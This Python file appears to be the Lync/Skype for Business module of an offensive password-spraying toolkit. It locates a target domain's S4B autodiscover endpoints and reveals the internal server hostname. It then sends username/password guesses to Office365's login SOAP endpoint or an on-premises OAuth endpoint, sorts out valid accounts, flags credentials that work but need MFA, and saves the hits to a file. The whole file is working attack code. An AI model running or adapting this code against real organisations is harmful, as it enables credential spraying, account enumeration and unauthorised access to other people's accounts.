import logging
import requests
import urllib.parse as urlparse
from datetime import timedelta
from requests.exceptions import ConnectionError
from sprayingtoolkit.core.utils.messages import *
from sprayingtoolkit.core.utils.time import simple_utc
from lxml import etree
from datetime import datetime


class Lync:
    def __init__(self, target):
        self.domain = target
        self.log = logging.getLogger('lyncsprayer')
        self.valid_accounts = set()
        self.lync_autodiscover_url = None
        self.lync_base_url = None
        self.lync_auth_url = None
        self.O365 = False

        self.recon()

    def recon(self):
        self.log.info(print_info("Trying to find autodiscover URL"))
        self.lync_autodiscover_url = self.get_s4b_autodiscover_url(self.domain)
        self.log.info(print_good(f"Using S4B autodiscover URL: {self.lync_autodiscover_url}"))

        self.lync_base_url = self.get_s4b_base_url(self.lync_autodiscover_url)
        self.log.debug(f"S4B base url: {self.lync_base_url}")
        if 'online.lync.com' in self.lync_base_url:
            self.log.info(print_info("S4B domain appears to be hosted on Office365"))
            self.O365 = True
        else:
            self.log.info(print_info("S4B domain appears to be hosted internally"))
            self.log.info(print_good(f"Internal hostname of S4B server: {self.get_internal_s4b_hostname(self.lync_base_url)}"))
            self.lync_auth_url = urlparse.urljoin('/'.join(self.lync_base_url.split('/')[0:3]), "/WebTicket/oauthtoken")

    def shutdown(self):
        with open('lync_valid_accounts.txt', 'a+') as account_file:
            for username in self.valid_accounts:
                account_file.write(username + '\n')

        self.log.info(print_good(f"Dumped {len(self.valid_accounts)} valid accounts to lync_valid_accounts.txt"))

    def get_s4b_autodiscover_url(self, domain):
        urls = [
            f"https://lyncdiscover.{domain}",
            f"https://lyncdiscoverinternal.{domain}"
        ]

        for url in urls:
            try:
                requests.get(url, verify=False)
                return url
            except ConnectionError:
                continue

    # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L259
    def get_s4b_base_url(self, url):
        headers = {"Content-Type": "application/json"}
        r = requests.get(url, headers=headers, verify=False).json()
        if 'user' in r['_links']:
            return r['_links']['user']['href']

        return self.get_s4b_base_url(r['_links']['redirect']['href'])

    def get_internal_s4b_hostname(self, url):
        r = requests.get(url, verify=False)
        return r.headers['X-MS-Server-Fqdn']

    # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L409
    def auth_O365(self, username, password):
        log = logging.getLogger(f"auth_lync_O365({username})")

        utc_time = datetime.utcnow().replace(tzinfo=simple_utc()).isoformat()
        utc_time_1 = (datetime.utcnow() + timedelta(days=1)).replace(tzinfo=simple_utc()).isoformat()

        soap = f"""<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
    <S:Header>
    <wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
    <wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To>
    <ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo">
        <ps:BinaryVersion>5</ps:BinaryVersion>
        <ps:HostingApp>Managed IDCRL</ps:HostingApp>
    </ps:AuthInfo>
    <wsse:Security>
    <wsse:UsernameToken wsu:Id="user">
        <wsse:Username>{username}</wsse:Username>
        <wsse:Password>{password}</wsse:Password>
    </wsse:UsernameToken>
    <wsu:Timestamp Id="Timestamp">
        <wsu:Created>{utc_time.replace('+00:00', '1Z')}</wsu:Created>
        <wsu:Expires>{utc_time_1.replace('+00:00', '1Z')}</wsu:Expires>
    </wsu:Timestamp>
</wsse:Security>
    </S:Header>
    <S:Body>
    <wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0">
        <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
        <wsp:AppliesTo>
        <wsa:EndpointReference>
            <wsa:Address>online.lync.com</wsa:Address>
        </wsa:EndpointReference>
        </wsp:AppliesTo>
        <wsp:PolicyReference URI="MBI"></wsp:PolicyReference>
    </wst:RequestSecurityToken>
    </S:Body>
</S:Envelope>"""

        headers = {'Content-Type': "application/soap+xml; charset=utf-8"}
        r = requests.post("https://login.microsoftonline.com/rst2.srf", headers=headers, data=soap)
        xml = etree.XML(r.text.encode())
        msg = xml.xpath('//text()')[-1]

        if 'Invalid STS request' in msg:
            log.error(print_bad('Invalid request was received by server, dumping request & response XML'))
            log.error(soap + '\n' + r.text)
        elif ('the account must be added' in msg) or ("The user account does not exist" in msg):
            log.info(print_bad(f"Authentication failed: {username}:{password} (Username does not exist)"))
        elif 'you must use multi-factor' in msg.lower():
            log.info(print_good(f"Found Credentials: {username}:{password} (However, MFA is required)"))
            self.valid_accounts.add(f'{username}:{password}')
        elif 'No tenant-identifying information found' in msg:
            log.info(print_bad(f"Authentication failed: {username}:{password} (No tenant-identifying information found)"))
        elif 'FailedAuthentication' in r.text: # Fallback
            log.info(print_bad(f"Authentication failed: {username}:{password} (Invalid credentials)"))
        else:
            log.info(print_good(f"Found credentials: {username}:{password}"))
            self.valid_accounts.add(f'{username}:{password}')

        log.debug(r.text)

    # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L397-L406
    def auth(self, username, password):
        log = logging.getLogger(f"auth_lync({username})")

        payload = {
            "grant_type": "password",
            "username": username,
            "password": password
        }

        r = requests.post(self.lync_auth_url, data=payload, verify=False)
        try:
            r.json()['access_token']
            log.info(print_good(f"Found credentials: {username}:{password}"))
            self.valid_accounts.add(f'{username}:{password}')
        except Exception as e:
            log.info(print_bad(f"Invalid credentials: {username}:{password}"))

    def __str__(self):
        return "lync"
